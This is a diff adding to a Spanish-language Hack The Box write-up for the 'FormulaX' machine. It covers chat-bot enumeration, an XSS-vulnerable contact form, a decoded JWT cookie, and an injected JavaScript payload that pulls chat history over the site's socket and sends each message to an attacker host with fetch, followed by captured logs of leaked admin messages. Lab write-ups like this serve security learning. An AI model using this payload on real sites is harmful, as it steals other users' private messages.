@@ -71,8 +71,78 @@ Nmap done: 1 IP address (1 host up) scanned in 10.95 seconds
 
 ```
 
-Nada Inusual hmm.... Vamos a ver la pagina Web.
-Como podemos ver, tenemos el puerto 80 abierto, en este caso corresponde hacer la revisión de lo que está publicado en dicho puerto:
+Nada Inusual hmm.... Como podemos ver, tenemos el puerto 80 abierto, en este caso corresponde hacer la revisión de lo que está publicado en dicho puerto.
+Nos redirige a un formulario login con opcion de registrarnos:
 ![](../assets/images/htb-writeup-formulax/register1.PNG)
 
+Por encima ver que tenemos la capacidad de interactur con un bot...
+![](../assets/images/htb-writeup-formulax/home.PNG)
 
+Al parecer el serivicio no esta activo pero aun asi podemos ejecutar el comando "help" el cual nos muestra los comandos activos:
+```"history -- Shows the Previous Sent"```
+![](../assets/images/htb-writeup-formulax/chat1.PNG)
+
+Parece interesante pero vamos a continuar con la enumeracion...
+![](../assets/images/htb-writeup-formulax/contact1.PNG)
+
+Hmm un formulario, vamos a ver si realmente hace algo por detras.
+![](../assets/images/htb-writeup-formulax/contact2.PNG)
+
+Ouu...Parece vulnerable a xss, interesante sigamos enumerando:
+![](../assets/images/htb-writeup-formulax/xss1.PNG)
+
+Parece que la cookie es una API key para sean mas seguras las peticiones con la API...
+
+```json
+{
+"alg":"HS256",
+"typ":"JWT"
+}
+{
+"userID"=:"65eda379658edff97d460d42",
+"iat":1710072703
+}json
+
+Si seguimos enumerando podemos ver que hay un archivo chat.js, en este podemos ver que esta haciendo conexiones socket para conectarse a los chats. hmm..
+Espera.. y si utilizamos las funciones para ver chats de otros ususarios?
+
+Si hacemos cremos este archivo .js utilizando las funciones para que nos rediriga los mensages puede que nos de algo, vamos a probarlo:
+
+```javascript
+let value;
+const res = axios.get(`/user/api/chat`);
+const socket = io('/',{withCredentials: true});
+
+const typing_chat_2 = () => {
+  value = "history"
+  if (value) {
+    // sending the  messages to the server
+    socket.emit('client_message', value)
+    Show_messages_on_screen_of_Client(value);
+    // here we will do out socket things..
+    document.getElementById('user_message').value = ""
+  }
+  else {
+    alert("Cannot send Empty Messages");
+  }
+}
+
+socket.on('message', (my_message) => {
+
+  //console.log("Received From Server: " + my_message)
+  fetch("http://10.10.14.25/?" + my_message );
+
+})
+
+typing_chat_2()
+```
+
+Vamoss..Tenemos lo que parece el historial de algun chat!!
+
+![](../assets/images/htb-writeup-formulax/xss2.PNG)
+```
+"OPTIONS /?Hello, I am Admin.Testing the Chat Application HTTP/1.1" 200 -
+"OPTIONS /?Write a script for  dev-git-auto-update.chatbot.htb to work properly HTTP/1.1" 200 -
+"OPTIONS /?Write a script to automate the auto-update
+```
+Un subdominio? eso parece.. vamos a echar un vistazo
